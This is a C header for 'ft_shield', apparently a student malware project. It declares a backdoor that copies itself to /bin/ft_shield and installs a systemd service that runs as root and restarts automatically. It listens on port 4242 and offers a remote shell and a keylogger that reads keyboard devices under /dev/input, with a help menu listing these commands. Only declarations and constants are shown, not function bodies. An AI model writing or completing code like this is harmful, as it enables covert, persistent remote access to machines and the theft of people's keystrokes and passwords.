#ifndef FT_SHIELD_H
# define FT_SHIELD_H

# ifndef DEBUG
#  define ENABLE
# endif

# include <fcntl.h>
# include <libgen.h>
# include <limits.h>
# include <stdbool.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <errno.h>
# include <unistd.h>
# include <arpa/inet.h>
# include <bsd/string.h>
# include <linux/limits.h>
# include <sys/types.h>
# include <sys/socket.h>
# include <sys/select.h>
# include <sys/un.h>
# include <sys/wait.h>
# include <sys/ioctl.h>
# include <linux/input.h>
# include <sys/stat.h>
# include <dirent.h>

#define DEST_PATH "/bin/ft_shield"
#define DEV_PATH "/dev/input/"
#define MAX_EVENTS 3
#define KEY_PRESSED 1
#define KEY_RELEASED 0
#define KEY_REPEATED 2
#define DEST_SERVICE "/etc/systemd/system/ft_shield.service"
#define LISTENING_PORT 4242
#define MAX_CONECTIONS 10
#define MAX_NBR_CLIENTS 2

#define TRIM_CHARS "\f\n\r\t\v "

#define HELP "\
---------------------------------\n\
?      - Shows help\n\
clear  - Clear terminal\n\
logon  - Spawns a keylogger in port 4242\n\
shell  - Spawn shell in port 4242\n\
nstats - Shows network stats\n\
---------------------------------\n\
"
#define REMOTE_OPENED "New remote shell opened in port 4242\n"
#define MANY_CLIENTS "Connection denied, too many clients\n"
#define CLEAR_CODE "\033[H\033[2J"

#define SERVICE "\
[Unit]\n\
Description=ft_shield service\n\
After=network.target\n\
\n\
[Service]\n\
Type=simple\n\
ExecStart=/bin/ft_shield\n\
Restart=always\n\
RestartSec=5\n\
User=root\n\
\n\
[Install]\n\
WantedBy=multi-user.target\n\
"

typedef struct s_list t_list;
typedef struct input_event t_event;

typedef enum e_status {
	HANDSHAKE,
	CONNECTED,
	SHELL,
	KEYLOGGER
} t_status;

typedef struct s_client {
	int			fd;
	t_status	status;
	char		*shell_code;
	char		*response_bffr;
	char		disconnect;
	size_t		inbytes; //client input bytes
	size_t		outbytes; //client output bytes
	int			inpipe_fd;
	int			outpipe_fd;
}	t_client;

typedef struct s_server {
	int			fd;
	int			nbr_clients;
	t_list		*pids;
	t_list		*passwords;
	t_client	clients[MAX_CONECTIONS];
	size_t		total_outbytes;
	size_t		total_inbytes;
}	t_server;


int		handle_input(t_server *server, int index, char *buffer);
void	handle_handshake(t_server *server, int index, char *input);
int		handle_commands(t_server *server, int index, char *input);
void	delete_client(t_server *server, int index);

/* shell.c */
// void	*shell_function(void *data);
void	*shell_function(t_server *server, int index);

/* keylogger.c */
void	*keylogger_function(t_server *server, int index);

/* keylogger_utils.c */
int hasEventTypes(int fd, unsigned long evbit_to_check);
int hasKeys(int fd);
int hasRelativeMovement(int fd);
int hasAbsoluteMovement(int fd);
int hasSpecificKeys(int fd, int *keys, size_t num_keys);
int keyboardFound(char *path, int *keyboard_fd);

/* service.c */
void	create_service(void);
void	start_service(void);

/* server.c */
void	create_server_socket(t_server *s);
void	ft_server(t_server *server);

int	find_own_path(char *buffer, size_t size_buffer);

/* utils/utils.c */
char	*ft_strtrim(char const *s1, char const *set);
void	simple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output);
char	*gen_random_password(void);

void	copy_file(char *src, char *dst);

void	ft_dprintf(int fd, const char *format, ...);
void	ft_perror(char *str);

char	*ft_strdup(const char *s1);
void	add2buffer(t_client *client, char *str);

/* utils/list.c */
typedef struct s_list
{
	void			*content;
	struct s_list	*next;
}	t_list;

t_list	*ft_lstnew(void *content);
t_list	*ft_lstlast(t_list *lst);
void	ft_lstadd_back(t_list **lst, t_list *new_node);
bool	shell_was_closed(t_list *node);
void	ft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *));
void	ft_lstdelone(t_list *lst, void (*del)(void *));
void	ft_lstclear(t_list **lst, void (*del)(void *));

#endif
